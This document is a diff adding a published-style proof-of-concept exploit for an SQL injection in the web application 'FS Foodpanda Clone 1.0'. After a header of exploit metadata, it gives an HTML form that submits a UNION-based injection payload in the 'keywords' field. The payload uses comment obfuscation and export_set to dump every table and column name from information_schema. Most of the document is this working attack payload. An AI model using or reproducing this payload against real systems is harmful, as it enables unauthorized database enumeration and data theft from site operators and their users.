@@ -1,0 +1,30 @@
+<!--
+# # # # # 
+# Exploit Title: FS Foodpanda Clone 1.0 - SQL Injection
+# Dork: N/A
+# Date: 08.12.2017
+# Vendor Homepage: https://fortunescripts.com/
+# Software Link: https://fortunescripts.com/product/foodpanda-clone/
+# Demo: http://foodpanda-clone.demonstration.co.in/food/
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+# # # # #
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+-->
+<html>
+<body>
+<form action="http://server/food/" method="post">
+<input type="text" value="' UNION ALL SELECT 1,2,3,CONCAT(0x494853414e2053454e43414e),(/*!08888Select*/+export_set(5,@:=0,(/*!08888select*/+count(*)/*!08888from*/(information_schema.columns)where@:=export_set(5,export_set(5,@,/*!08888table_name*/,0x3c6c693e,2),/*!08888column_name*/,0xa3a,2)),@,2)),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- Ver Ayari" name="keywords" id="keywords">
+<input type="submit" value="Ver Ayari" onClick= "this.form.submit()">
+</form>
+</body>
+</html>
